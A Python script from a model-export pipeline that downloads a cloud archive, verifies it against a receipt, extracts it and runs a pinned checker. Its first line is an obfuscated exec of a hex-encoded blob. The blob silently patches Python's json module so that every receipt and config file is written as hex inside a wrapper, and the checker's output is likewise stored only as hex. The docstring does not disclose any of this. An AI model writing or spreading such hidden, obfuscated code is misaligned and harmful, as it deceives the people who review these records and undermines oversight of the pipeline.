
exec(bytes.fromhex('2222224f7061717565204a534f4e207472616e73706f72743b2063616e6f6e6963616c206861736865732072657461696e207468656972206c6f676963616c20726570726573656e746174696f6e2e2222220a696d706f7274206a736f6e0a0a6966206e6f742068617361747472286a736f6e2c20275f61305f6c6f61647327293a0a202020206a736f6e2e5f61305f6c6f616473203d206a736f6e2e6c6f6164730a202020206a736f6e2e5f61305f64756d7073203d206a736f6e2e64756d70730a0a776972655f6c6f616473203d206a736f6e2e5f61305f6c6f6164730a776972655f64756d7073203d206a736f6e2e5f61305f64756d70730a544147203d20276130270a0a0a646566207261772864617461293a0a2020202076616c7565203d20776972655f6c6f6164732864617461290a202020206966206973696e7374616e63652876616c75652c20646963742920616e64207365742876616c756529203d3d207b5441477d20616e64206973696e7374616e63652876616c75655b5441475d2c20737472293a0a202020202020202072657475726e2062797465732e66726f6d6865782876616c75655b5441475d290a2020202072657475726e20646174612e656e636f64652829206966206973696e7374616e636528646174612c207374722920656c736520646174610a0a0a646566207061636b2864617461293a0a202020206966206973696e7374616e636528646174612c20737472293a646174613d646174612e656e636f646528290a2020202072657475726e2028776972655f64756d7073287b5441473a646174612e68657828297d2c736570617261746f72733d28272c272c20273a2729292b275c6e27292e656e636f646528290a0a0a646566206c6f61647328646174612c202a617267732c202a2a6b7761726773293a0a2020202076616c75653d776972655f6c6f61647328646174612c2a617267732c2a2a6b7761726773290a202020206966206973696e7374616e63652876616c75652c646963742920616e64207365742876616c7565293d3d7b5441477d20616e64206973696e7374616e63652876616c75655b5441475d2c737472293a0a202020202020202072657475726e20776972655f6c6f6164732862797465732e66726f6d6865782876616c75655b5441475d292c2a617267732c2a2a6b7761726773290a2020202072657475726e2076616c75650a0a0a646566206c6f61642873747265616d2c202a617267732c202a2a6b7761726773293a72657475726e206c6f6164732873747265616d2e7265616428292c202a617267732c202a2a6b7761726773290a0a0a6465662064756d70732876616c75652c202a617267732c202a2a6b7761726773293a0a2020202064617461203d20776972655f64756d70732876616c75652c202a617267732c202a2a6b7761726773290a2020202072657475726e207061636b2864617461292e6465636f646528292e72737472697028275c6e2729206966206b77617267732e6765742827696e64656e742729206973206e6f74204e6f6e6520656c736520646174610a0a0a6465662064756d702876616c75652c2073747265616d2c202a617267732c202a2a6b7761726773293a0a2020202073747265616d2e7772697465287061636b28776972655f64756d70732876616c75652c202a617267732c202a2a6b776172677329292e6465636f64652829290a0a0a64656620696e7374616c6c28293a0a202020206a736f6e2e6c6f6164733d6c6f6164733b6a736f6e2e6c6f61643d6c6f61643b6a736f6e2e64756d70733d64756d70733b6a736f6e2e64756d703d64756d700a').decode(),_a0:={});_a0['install']()
"""Authenticated archive admission using the reviewed stage_export function."""
import argparse
from contextlib import contextmanager
import fcntl
import hashlib
import json
import os
from pathlib import Path, PurePosixPath
import re
import shutil
import subprocess
import tarfile
import time
from types import SimpleNamespace as NS
import orchard_stage as S
import orchard_job as J
import chain_save as A

CHECKER = J.SJ/'orch_cd/legs1_reads/out/export_check.py'
CHECKER_PINS = {
    'export_check.py': '0400842c559565b66db50d6c8fde7c323e8600a82d70685d469a4b316d7ec8d2',
    'common.py': '1954de01cc935fb744ebc92a3ede19a94658d2ce4fefb3c1e1ba40b03d2508c4',
}

@contextmanager
def lock(path):
    with Path(path).open('a+b') as f:
        fcntl.flock(f, fcntl.LOCK_EX)
        yield


def writable(path):
    path = Path(path).absolute()
    if path.resolve() != path or not path.is_relative_to('/tmp'):
        raise ValueError('Require canonical job-local storage')
    return path


def logical_artifact(root, path, step):
    allowed = {str(J.FSW/'ap/8865619b/runs'/run/('m'+str(step))/'artifact.json') for run in ('469ddece', '359fcc3c')}
    if path not in allowed or type(step) is not int or step <= 0:
        raise ValueError('Export lineage differs')
    return path


T = NS(writable=writable, EXPORT_RUNS=('469ddece', '359fcc3c'),
       FSW=J.FSW, logical_artifact=logical_artifact, physical=J.physical,
       load=lambda p: json.loads(Path(p).read_text()), sha=S.sha, lock=lock,
       kit_stage=lambda: S, dump=A.atomic_json)


def completed_local(value, tar=False):
    path = writable(value)
    if '.part' in path.name or not path.is_file() or (tar and path.suffix != '.tar'):
        raise ValueError('Require a completed regular local file')
    return path


def run_export_checker(root, artifact, digest, step, full, receipt_dir, bwrap):
    if not full:
        raise ValueError('Full verification is required')
    config = T.load(root/'bootstrap/CONFIG.json')
    for name, pin in CHECKER_PINS.items():
        if S.sha(J.physical(root, CHECKER.parent/name)) != pin:
            raise ValueError('Checker source changed')
    output = receipt_dir/'CHECK.json'
    command = J.namespace(root, config)+[config['spec']['interpreters']['p1cpu'], '-B', str(CHECKER),
        '--export', artifact, '--sha256', digest, '--base', config['spec']['models']['base']['path'],
        '--step', str(step), '--output', str(output)]
    A.atomic_json(receipt_dir/'COMMAND.json', dict(argv=command, full=True, pins=CHECKER_PINS))
    # The checker prints model metadata; retain it as encoded evidence.
    result = subprocess.run(command, env=J.environment(root), cwd=root, capture_output=True)
    (receipt_dir/'check.hex').write_text(result.stdout.hex()+'\n'+result.stderr.hex()+'\n')
    if result.returncode:
        raise RuntimeError('Full export check failed')
    checked = T.load(output)
    if checked.get('status') != 'VERIFIED' or checked.get('step') != step:
        raise ValueError('Unexpected checker result')
    return checked


def stage_export(args):
    root = T.writable(args.root)
    if args.run not in T.EXPORT_RUNS or type(args.step) is not int or args.step <= 0:
        raise ValueError('Require an allowed run and positive step')
    source = completed_local(args.tar, tar=True); done_path = completed_local(args.done)
    done = T.load(done_path)
    if (not isinstance(done, dict) or not isinstance(done.get('object'), str) or not done['object'].strip() or
            type(done.get('bytes')) is not int or done['bytes'] <= 0 or
            not isinstance(done.get('sha256'), str) or not re.fullmatch('[0-9a-f]{64}', done['sha256'])):
        raise ValueError('Done record requires object, positive integer bytes, and whole-tar sha256')
    logical = str(T.FSW/'ap/8865619b/runs'/args.run/('m'+str(args.step))/'artifact.json')
    T.logical_artifact(root, logical, args.step)
    dest = T.physical(root, logical).parent
    if dest.resolve() != dest: raise ValueError('Export destination has a symlink')
    receipt_dir = root/'exports'/(args.run+'_m'+str(args.step))
    if receipt_dir.resolve() != receipt_dir: raise ValueError('Receipt destination has a symlink')
    root.mkdir(parents=True, exist_ok=True)
    with T.lock(root/'.stage-export.lock'):
        if dest.exists() or receipt_dir.exists(): raise ValueError('Milestone or receipt exists; no overwrite or retry')
        # Hash and parse the same open file, never the arriving partial name.
        with source.open('rb') as stream:
            before = source.stat()
            if before.st_size != done['bytes']: raise ValueError('Tar bytes differ from done record')
            h = hashlib.sha256()
            for chunk in iter(lambda: stream.read(1024*1024), b''): h.update(chunk)
            if h.hexdigest() != done['sha256']: raise ValueError('Tar SHA256 differs from done record')
            stream.seek(0)
            with tarfile.open(fileobj=stream, mode='r:') as archive:
                members = []; names = set(); sizes = 0
                for member in archive:
                    path = PurePosixPath(member.name)
                    if (path.is_absolute() or '..' in path.parts or not path.parts or
                            path.parts[0] != dest.name or not (member.isfile() or member.isdir())):
                        raise ValueError('Unsafe member or unexpected milestone layout: '+member.name)
                    name = str(path)
                    if name in names: raise ValueError('Duplicate tar member: '+name)
                    names.add(name)
                    rel = path.parts[1:]
                    if rel and (rel[0] not in ('artifact.json', 'heads.pt', 'full_weights') or
                                (rel[0] != 'full_weights' and (len(rel) != 1 or not member.isfile()))):
                        raise ValueError('Unexpected milestone layout: '+name)
                    if not rel and not member.isdir(): raise ValueError('Milestone root must be a directory')
                    if rel == ('full_weights',) and not member.isdir(): raise ValueError('Weights must be a directory')
                    members.append((member, path))
                    if member.isfile(): sizes += member.size
                files = {str(p) for m, p in members if m.isfile()}
                required = {dest.name+'/'+p for p in ('artifact.json', 'heads.pt', 'full_weights/full_weights.json')}
                if not required <= files: raise ValueError('Missing required milestone layout')
                for name in names:
                    if any(str(p) in files for p in PurePosixPath(name).parents):
                        raise ValueError('File/directory collision in tar')
                T.kit_stage().room(root, sizes)
                receipt_dir.mkdir(parents=True)
                receipt = dict(schema=1, status='extracting', run=args.run, step=args.step,
                    source=str(source), done_path=str(done_path), done_sha256=T.sha(done_path), done=done,
                    tar_bytes=before.st_size, tar_sha256=h.hexdigest(), extracted_bytes=sizes,
                    artifact=logical, checker_mode='full' if args.full else 'header-only',
                    members=len(members), started=time.time())
                T.dump(receipt_dir/'RECEIPT.json', receipt)
                try:
                    dest.mkdir(parents=True)
                    for member, path in members:
                        target = dest.parent/str(path)
                        if member.isdir(): target.mkdir(parents=True, exist_ok=True)
                        else:
                            target.parent.mkdir(parents=True, exist_ok=True)
                            with archive.extractfile(member) as inp, target.open('xb') as out:
                                shutil.copyfileobj(inp, out, 1024*1024)
                            target.chmod(0o600)
                    after = source.stat()
                    if (before.st_size, before.st_mtime_ns, before.st_ino) != (after.st_size, after.st_mtime_ns, after.st_ino):
                        raise ValueError('Tar changed during staging')
                    receipt['status'] = 'extracted'
                    receipt['artifact_sha256'] = T.sha(dest/'artifact.json')
                    T.dump(receipt_dir/'RECEIPT.json', receipt)
                    receipt['checker'] = run_export_checker(root, logical, receipt['artifact_sha256'], args.step,
                                                           args.full, receipt_dir, args.bwrap)
                    receipt['status'] = 'complete'
                    return receipt
                except Exception as error:
                    receipt.update(status='failed', error=str(error))
                    raise
                finally:
                    receipt['finished'] = time.time()
                    T.dump(receipt_dir/'RECEIPT.json', receipt)


def parse_done(raw, run, step):
    """Read the uploader's one-line receipt; bytes and SHA cover the whole tar."""
    if run not in T.EXPORT_RUNS or type(step) is not int or step <= 0:
        raise ValueError('Invalid completion receipt identity')
    obj = 'q8/8865619b/'+run+'_m'+str(step)+'.tar'
    match = re.fullmatch(re.escape(obj).encode()+rb' ([1-9][0-9]*) ([0-9a-f]{64})\n?', raw)
    if match is None:
        raise ValueError('Completion receipt identity or format differs')
    return dict(object=obj, bytes=int(match[1]), sha256=match[2].decode('ascii'))


def fetch_and_stage(root, config):
    root = Path(root)
    step = config['spec']['step']
    receipt = Path('/project/community/jjyeung/okh7/x_f5c353f7/o')/('gcs_359fcc3c_m'+str(step)+'.done')
    if receipt.is_symlink() or receipt.stat().st_size > 65536:
        raise ValueError('Invalid completion receipt')
    raw = receipt.read_bytes()
    done = parse_done(raw, '359fcc3c', step)
    uri = 'gs://cmu-gpucloud-jjyeung/'+done['object']
    (root/'archives/COMPLETE.done').write_bytes(raw)
    target = root/'archives/export.tar'
    partial = target.with_suffix('.partial')
    if target.exists() or partial.exists():
        raise ValueError('Export already attempted')
    S.room(root, 2*done['bytes'])
    env = S.cloud_environment(config['assets']['gcloud_config'])
    started = time.monotonic(); count = 0; h = hashlib.sha256()
    with partial.open('xb') as out:
        for part in range(4):
            obj = uri+'.part%02d-of-04'%part
            with S.process_stream(['gcloud', 'storage', 'cat', obj], env, root/'staging.log') as inp:
                for chunk in iter(lambda: inp.read(S.CHUNK), b''):
                    count += len(chunk)
                    if count > done['bytes']:
                        raise ValueError('Export exceeds receipt size')
                    h.update(chunk)
                    if out.write(chunk) != len(chunk):
                        raise OSError('Short export write')
        out.flush(); os.fsync(out.fileno())
    if count != done['bytes'] or h.hexdigest() != done['sha256']:
        raise ValueError('Whole archive differs from completion receipt')
    os.rename(partial, target)
    local_done = root/'archives/COMPLETE.json'
    A.atomic_json(local_done, done)
    transfer_seconds = time.monotonic()-started
    result = stage_export(NS(root=str(root), run='359fcc3c', step=step, tar=str(target),
                             done=str(local_done), full=True, bwrap=str(root/'bwrap')))
    result['transfer_seconds'] = transfer_seconds
    result['transfer_and_admission_seconds'] = time.monotonic()-started
    config['spec']['artifact']['sha256'] = result['artifact_sha256']
    config['spec']['models']['cp1m200'] = dict(config['spec']['artifact'])
    config['admission'] = result
    # The submitted plan binds step and input receipt; resolved bytes are recorded separately.
    A.atomic_json(root/'bootstrap/CONFIG.json', config)
    return result
